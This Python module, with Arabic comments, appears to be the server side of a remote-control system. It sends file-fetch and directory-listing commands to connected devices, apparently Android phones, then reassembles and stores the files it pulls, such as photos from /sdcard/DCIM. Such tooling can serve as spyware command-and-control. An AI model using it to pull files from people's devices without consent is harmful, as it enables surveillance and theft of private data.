#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
files.py
============================================================
تنفيذ أوامر GET FILE و LIST DIR من جانب السيرفر.

المسؤوليات:
  1. GET FILE  : سحب ملف محدد من الجهاز.
  2. LIST DIR  : عرض محتوى مجلد على الجهاز.
  3. استقبال FILE_CHUNK وتجميعها.
  4. حفظ الملفات في storage/received/<client_id>/files/.
  5. عرض نتائج LIST DIR في الطرفية.

يعتمد على:
  - ClientSession (لإرسال الأوامر واستقبالها)
  - DATA (لاستقبال نتيجة LIST DIR)

الاستخدام:
  handler = FilesCommand(session_manager)
  await handler.execute_get_file(client_id, "/sdcard/DCIM/photo.jpg")
  await handler.execute_list_dir(client_id, "/sdcard/DCIM")
============================================================
"""

import asyncio
import base64
import logging
import os
import re
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

from core.client_session import ClientSession
from core.session_manager import SessionManager

logger = logging.getLogger("files")


# ============================================================
# 1. الإعدادات
# ============================================================
BASE_DIR = Path(__file__).resolve().parent.parent.parent
STORAGE_DIR = BASE_DIR / "storage" / "received"

# مهلة انتظار كامل الملف (ثواني)
FILE_TIMEOUT_SECONDS = 300

# مهلة انتظار نتيجة LIST DIR (ثواني)
LIST_TIMEOUT_SECONDS = 30


# ============================================================
# 2. نموذج ملف قيد الاستقبال
# ============================================================
@dataclass
class IncomingFile:
    """يمثّل ملفاً قيد الاستقبال."""
    filename: str
    remote_path: str = ""
    total_size: int = 0
    total_chunks: int = 0
    mime: str = "application/octet-stream"
    chunks: Dict[int, bytes] = field(default_factory=dict)
    started_at: float = field(default_factory=time.time)
    last_update: float = field(default_factory=time.time)
    last_progress_log: float = field(default_factory=time.time)

    # --------------------------------------------------------
    # خصائص
    # --------------------------------------------------------
    @property
    def received_chunks(self) -> int:
        return len(self.chunks)

    @property
    def received_bytes(self) -> int:
        return sum(len(c) for c in self.chunks.values())

    @property
    def progress(self) -> float:
        if self.total_size > 0:
            return min(1.0, self.received_bytes / self.total_size)
        if self.total_chunks > 0:
            return self.received_chunks / self.total_chunks
        return 0.0

    @property
    def is_complete(self) -> bool:
        if self.total_chunks > 0:
            return self.received_chunks >= self.total_chunks
        if self.total_size > 0:
            return self.received_bytes >= self.total_size
        return False

    @property
    def is_stale(self) -> bool:
        return (time.time() - self.last_update) > FILE_TIMEOUT_SECONDS

    @property
    def elapsed_seconds(self) -> float:
        return time.time() - self.started_at

    # --------------------------------------------------------
    # عمليات
    # --------------------------------------------------------
    def add_chunk(self, index: int, data: bytes) -> None:
        self.chunks[index] = data
        self.last_update = time.time()

    def assemble(self) -> Optional[bytes]:
        if not self.is_complete:
            return None
        try:
            return b"".join(
                self.chunks[i] for i in sorted(self.chunks.keys())
            )
        except KeyError as e:
            logger.error(f"Missing chunk {e} for {self.filename}")
            return None

    def progress_summary(self) -> str:
        pct = int(self.progress * 100)
        received_mb = self.received_bytes / (1024 * 1024)
        total_mb = self.total_size / (1024 * 1024) if self.total_size > 0 else 0
        if total_mb > 0:
            return f"{pct}% | {received_mb:.2f}/{total_mb:.2f} MB"
        return f"{pct}% | {received_mb:.2f} MB"


# ============================================================
# 3. FilesCommand
# ============================================================
class FilesCommand:
    """
    منفّذ أوامر GET FILE و LIST DIR.
    """

    def __init__(self, session_manager: SessionManager):
        self.session_manager = session_manager

        # الملفات قيد الاستقبال
        # {client_id: {remote_path: IncomingFile}}
        self._incoming: Dict[str, Dict[str, IncomingFile]] = {}

        # انتظار نتائج LIST DIR
        # {request_id: asyncio.Future}
        self._pending_lists: Dict[str, asyncio.Future] = {}

    # ========================================================
    # 3.1 GET FILE
    # ========================================================
    async def execute_get_file(
        self,
        client_id: str,
        remote_path: str,
    ) -> bool:
        """
        إرسال أمر GET_FILE للعميل.

        :param client_id: معرف العميل
        :param remote_path: مسار الملف على الجهاز
        :return: True إذا تم الإرسال بنجاح
        """
        session = self.session_manager.get_session(client_id)
        if session is None:
            logger.warning(f"Client not found: {client_id}")
            return False

        if not remote_path:
            logger.warning("Empty remote_path")
            return False

        # ----- تجهيز الأمر -----
        command = {
            "cmd": "GET_FILE",
            "payload": {
                "path": remote_path,
            },
        }

        # ----- تتبع الملف المتوقع -----
        if client_id not in self._incoming:
            self._incoming[client_id] = {}

        # ----- إرسال -----
        ok = await session.send_command(command)
        if ok:
            logger.info(f"[{client_id}] GET_FILE sent: {remote_path}")
        return ok

    # ========================================================
    # 3.2 LIST DIR
    # ========================================================
    async def execute_list_dir(
        self,
        client_id: str,
        remote_path: str,
        timeout: float = LIST_TIMEOUT_SECONDS,
    ) -> Optional[Dict[str, Any]]:
        """
        إرسال أمر LIST_DIR وانتظار النتيجة.

        :param client_id: معرف العميل
        :param remote_path: مسار المجلد على الجهاز
        :param timeout: مهلة الانتظار (ثواني)
        :return: قاموس يحتوي على نتيجة العرض، أو None عند الفشل
        """
        session = self.session_manager.get_session(client_id)
        if session is None:
            logger.warning(f"Client not found: {client_id}")
            return None

        if not remote_path:
            logger.warning("Empty remote_path")
            return None

        # ----- توليد معرف فريد -----
        request_id = f"list-{int(time.time() * 1000)}"

        # ----- إنشاء Future للانتظار -----
        loop = asyncio.get_event_loop()
        future: asyncio.Future = loop.create_future()
        self._pending_lists[request_id] = future

        # ----- إرسال الأمر -----
        command = {
            "id": request_id,
            "cmd": "LIST_DIR",
            "payload": {
                "path": remote_path,
            },
        }

        ok = await session.send_command(command)
        if not ok:
            self._pending_lists.pop(request_id, None)
            return None

        logger.info(f"[{client_id}] LIST_DIR sent: {remote_path}")

        # ----- انتظار النتيجة -----
        try:
            result = await asyncio.wait_for(future, timeout=timeout)
            return result
        except asyncio.TimeoutError:
            logger.warning(f"[{client_id}] LIST_DIR timeout for {remote_path}")
            self._pending_lists.pop(request_id, None)
            return None
        except Exception as e:
            logger.exception(f"LIST_DIR error: {e}")
            self._pending_lists.pop(request_id, None)
            return None

    # ========================================================
    # 3.3 معالج FILE_CHUNK الوارد
    # ========================================================
    async def on_file_chunk(
        self,
        client_id: str,
        message: Dict[str, Any],
    ) -> Optional[Path]:
        """
        يُستدعى عند وصول FILE_CHUNK لملف GET_FILE.
        """
        # ----- استخراج -----
        filename  = message.get("filename", "unknown")
        mime      = message.get("mime", "application/octet-stream")
        size      = int(message.get("size", 0))
        index     = int(message.get("index", 0))
        total     = int(message.get("total", 0))
        chunk_b64 = message.get("chunk", "")
        remote_path = message.get("path", filename)

        if not chunk_b64:
            logger.warning(f"[{client_id}] FILE_CHUNK without data")
            return None

        # ----- فك Base64 -----
        try:
            chunk_data = base64.b64decode(chunk_b64)
        except Exception as e:
            logger.error(f"[{client_id}] Invalid base64: {e}")
            return None

        # ----- سجل العميل -----
        if client_id not in self._incoming:
            self._incoming[client_id] = {}
        client_files = self._incoming[client_id]

        # ----- المفتاح: remote_path (لأن اسم الملف قد يتكرر) -----
        key = remote_path

        if key not in client_files:
            client_files[key] = IncomingFile(
                filename=filename,
                remote_path=remote_path,
                total_size=size,
                total_chunks=total,
                mime=mime,
            )
            logger.info(
                f"[{client_id}] 📄 Receiving file: {filename} "
                f"({self._format_size(size)}, {total} chunks)"
            )

        file_entry = client_files[key]
        file_entry.add_chunk(index, chunk_data)

        # ----- عرض التقدم -----
        self._maybe_log_progress(client_id, file_entry)

        # ----- اكتمل؟ -----
        if file_entry.is_complete:
            saved_path = await self._save_file(client_id, file_entry)
            if saved_path:
                del client_files[key]
                self._log_completion(client_id, file_entry, saved_path)
                return saved_path

        return None

    # ========================================================
    # 3.4 معالج DATA الوارد (نتيجة LIST_DIR)
    # ========================================================
    async def on_list_result(
        self,
        client_id: str,
        message: Dict[str, Any],
    ) -> bool:
        """
        يُستدعى عند وصول DATA من LIST_DIR.

        :return: True إذا تم المطابقة
        """
        request_id = message.get("id")
        if not request_id:
            logger.debug("LIST result without id, ignoring")
            return False

        future = self._pending_lists.pop(request_id, None)
        if future is None:
            logger.debug(f"No pending list for {request_id}")
            return False

        # ----- تحليل البيانات -----
        data_raw = message.get("data", "")
        try:
            import json
            data = json.loads(data_raw) if data_raw else {}
        except Exception:
            data = {"raw": data_raw}

        # ----- إشعار المنتظر -----
        if not future.done():
            future.set_result(data)

        logger.info(f"[{client_id}] LIST_DIR result received ({request_id})")
        return True

    # ========================================================
    # 3.5 حفظ الملف
    # ========================================================
    async def _save_file(self, client_id: str, file_entry: IncomingFile) -> Optional[Path]:
        """
        تجميع الأجزاء وحفظ الملف.
        """
        data = file_entry.assemble()
        if data is None:
            logger.error(f"[{client_id}] Failed to assemble {file_entry.filename}")
            return None

        # ----- مجلد العميل -----
        client_dir = STORAGE_DIR / client_id / "files"
        client_dir.mkdir(parents=True, exist_ok=True)

        # ----- اسم آمن -----
        safe_name = self._sanitize_filename(file_entry.filename)

        # ----- معالجة التكرار -----
        final_path = client_dir / safe_name
        counter = 1
        while final_path.exists():
            stem = re.sub(r"_\d+$", "", final_path.stem)
            suffix = final_path.suffix
            final_path = client_dir / f"{stem}_{counter}{suffix}"
            counter += 1

        # ----- كتابة غير معطّلة -----
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, final_path.write_bytes, data)
            return final_path
        except Exception as e:
            logger.exception(f"Failed to write {final_path}: {e}")
            return None

    # ========================================================
    # 3.6 معالجة التقدم
    # ========================================================
    def _maybe_log_progress(self, client_id: str, file_entry: IncomingFile) -> None:
        """طباعة التقدم كل ثانيتين."""
        now = time.time()
        if (now - file_entry.last_progress_log) < 2.0:
            return
        file_entry.last_progress_log = now
        logger.info(f"[{client_id}] {file_entry.filename}: {file_entry.progress_summary()}")

    def _log_completion(self, client_id: str, file_entry: IncomingFile, path: Path) -> None:
        """طباعة رسالة الاكتمال."""
        logger.info(
            f"[{client_id}] ✅ Saved file: {path.name} "
            f"({self._format_size(file_entry.received_bytes)})"
        )

    # ========================================================
    # 3.7 تنظيف
    # ========================================================
    def get_pending_files(self, client_id: str) -> List[str]:
        return list(self._incoming.get(client_id, {}).keys())

    def has_pending_files(self, client_id: str) -> bool:
        return bool(self._incoming.get(client_id))

    async def cleanup_stale(self) -> int:
        """إزالة الملفات القديمة."""
        removed = 0
        for client_id in list(self._incoming.keys()):
            files = self._incoming[client_id]
            for key in list(files.keys()):
                file_entry = files[key]
                if file_entry.is_stale:
                    logger.warning(
                        f"[{client_id}] Stale file removed: {file_entry.filename}"
                    )
                    del files[key]
                    removed += 1
            if not files:
                del self._incoming[client_id]
        return removed

    def clear_client(self, client_id: str) -> None:
        """مسح كل الملفات قيد الاستقبال لعميل."""
        if client_id in self._incoming:
            del self._incoming[client_id]
        # إلغاء كل الانتظارات
        for rid, fut in list(self._pending_lists.items()):
            if not fut.done():
                fut.cancel()
            self._pending_lists.pop(rid, None)
        logger.info(f"[{client_id}] Cleared pending files")

    # ========================================================
    # 3.8 أدوات مساعدة
    # ========================================================
    @staticmethod
    def _sanitize_filename(filename: str) -> str:
        """تنظيف اسم الملف."""
        if not filename:
            return "unnamed"

        name = os.path.basename(filename)
        name = re.sub(r'[<>:"/\\|?*\x00-\x1f]', "_", name)

        if name in (".", "..", ""):
            name = "unnamed"

        if len(name) > 200:
            stem, ext = os.path.splitext(name)
            name = stem[:180] + ext[:20]

        return name

    @staticmethod
    def _format_size(bytes_size: int) -> str:
        """تنسيق الحجم."""
        if bytes_size < 1024:
            return f"{bytes_size} B"
        if bytes_size < 1024 * 1024:
            return f"{bytes_size / 1024:.1f} KB"
        if bytes_size < 1024 * 1024 * 1024:
            return f"{bytes_size / (1024 * 1024):.1f} MB"
        return f"{bytes_size / (1024 * 1024 * 1024):.2f} GB"

    # ========================================================
    # 3.9 تنسيق نتيجة LIST_DIR
    # ========================================================
    @staticmethod
    def format_list_result(data: Dict[str, Any]) -> str:
        """
        تنسيق نتيجة LIST_DIR للعرض في الطرفية.
        """
        if not data:
            return "  (فارغ)"

        path = data.get("path", "?")
        items = data.get("items", [])

        if not items:
            return f"📁 {path}\n  (لا توجد عناصر)"

        lines = [f"📁 {path}", f"  {len(items)} عنصر", "─" * 50]

        # ترتيب: مجلدات أولاً، ثم ملفات
        dirs = [i for i in items if i.get("is_dir")]
        files = [i for i in items if not i.get("is_dir")]

        for item in dirs:
            name = item.get("name", "?")
            lines.append(f"  📁 {name}/")

        for item in files:
            name = item.get("name", "?")
            size = item.get("size", 0)
            size_str = FilesCommand._format_size(size)
            lines.append(f"  📄 {name} ({size_str})")

        return "\n".join(lines)


# ============================================================
# 4. Singleton
# ============================================================
_default_handler: Optional[FilesCommand] = None


def get_files_handler(session_manager: SessionManager) -> FilesCommand:
    """إرجاع المعالج (Singleton)."""
    global _default_handler
    if _default_handler is None:
        _default_handler = FilesCommand(session_manager)
    return _default_handler